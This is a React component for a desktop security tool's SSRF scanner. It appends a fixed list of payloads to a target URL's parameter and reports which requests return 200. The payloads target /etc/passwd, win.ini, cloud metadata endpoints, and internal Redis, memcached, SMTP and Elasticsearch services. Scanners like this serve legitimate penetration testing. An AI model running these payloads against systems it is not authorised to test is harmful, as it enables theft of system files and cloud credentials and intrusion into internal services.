import React, { useState } from 'react';
import { useStore } from '../../store/store';
import styles from './SharedTool.module.css';
import { NetworkIcon, LoadingIcon } from '../common/Icons';
import ToolWrapper from './ToolWrapper';

const SSRFAdvanced: React.FC = () => {
  const { addToolResult } = useStore();
  const [targetUrl, setTargetUrl] = useState('');
  const [paramName, setParamName] = useState('url');
  const [results, setResults] = useState<
    Array<{ protocol: string; payload: string; status: string }>
  >([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const ssrfPayloads = [
    { protocol: 'file://', payload: 'file:///etc/passwd' },
    { protocol: 'file://', payload: 'file:///c:/windows/win.ini' },
    { protocol: 'gopher://', payload: 'gopher://127.0.0.1:25/xHELO' },
    { protocol: 'dict://', payload: 'dict://127.0.0.1:11211/stat' },
    { protocol: 'http://', payload: 'http://169.254.169.254/latest/meta-data/' },
    { protocol: 'http://', payload: 'http://metadata.google.internal/computeMetadata/v1/' },
    { protocol: 'http://', payload: 'http://localhost:6379/' },
    { protocol: 'http://', payload: 'http://127.0.0.1:9200/_cluster/health' },
  ];

  const testSSRF = async () => {
    if (!targetUrl.trim()) {
      setError('Target URL is required');
      return;
    }

    setLoading(true);
    setError(null);
    setResults([]);

    try {
      const found: Array<{ protocol: string; payload: string; status: string }> = [];

      for (const { protocol, payload } of ssrfPayloads) {
        try {
          const testUrl = `${targetUrl}${targetUrl.includes('?') ? '&' : '?'}${paramName}=${encodeURIComponent(payload)}`;

          const result = await window.electronAPI.net.httpFetch(testUrl, {
            method: 'GET',
            timeout: 5000,
          });

          const status =
            result.status === 200 ? 'Potentially Vulnerable' : `Status: ${result.status}`;
          found.push({ protocol, payload, status });
        } catch (err) {
          found.push({ protocol, payload, status: 'Blocked/Error' });
        }

        await new Promise((resolve) => setTimeout(resolve, 200));
      }

      setResults(found);

      addToolResult({
        id: Date.now().toString(),
        toolName: 'SSRF Advanced',
        timestamp: Date.now(),
        input: { targetUrl, paramName },
        output: found,
        success: true,
      });
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : 'SSRF test failed';
      setError(message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <ToolWrapper
      title="SSRF Advanced Scanner"
      icon={<NetworkIcon />}
      description="Test for Server-Side Request Forgery vulnerabilities"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Target URL</label>
          <input
            type="text"
            className={styles.input}
            placeholder="https://example.com/page"
            value={targetUrl}
            onChange={(e) => setTargetUrl(e.target.value)}
          />
        </div>

        <div className={styles.inputGroup}>
          <label className={styles.label}>Parameter Name</label>
          <input
            type="text"
            className={styles.input}
            placeholder="url"
            value={paramName}
            onChange={(e) => setParamName(e.target.value)}
          />
        </div>

        <div className={styles.buttonGroup}>
          <button className={styles.primaryBtn} onClick={testSSRF} disabled={loading}>
            {loading ? (
              <>
                <LoadingIcon /> Testing...
              </>
            ) : (
              'Test SSRF'
            )}
          </button>
        </div>
      </div>

      {error && <div className={styles.errorBox}>{error}</div>}

      {loading && (
        <div className={styles.loadingBox}>
          <div className={styles.spinner}></div>
          <span>Testing SSRF payloads...</span>
        </div>
      )}

      {results.length > 0 && (
        <div className={styles.resultBox}>
          <div className={styles.resultHeader}>
            <span className={styles.resultTitle}>SSRF Test Results</span>
          </div>
          {results.map((result, idx) => (
            <div key={idx} className={styles.resultItem}>
              <div className={styles.resultRow}>
                <span className={styles.resultLabel} style={{ color: '#00ffaa' }}>
                  {result.protocol}
                </span>
                <span style={{ color: '#888' }}>{result.payload}</span>
                <span
                  style={{
                    color: result.status.includes('Vulnerable') ? '#ff4444' : '#888',
                  }}
                >
                  {result.status}
                </span>
              </div>
            </div>
          ))}
        </div>
      )}
    </ToolWrapper>
  );
};

export default SSRFAdvanced;
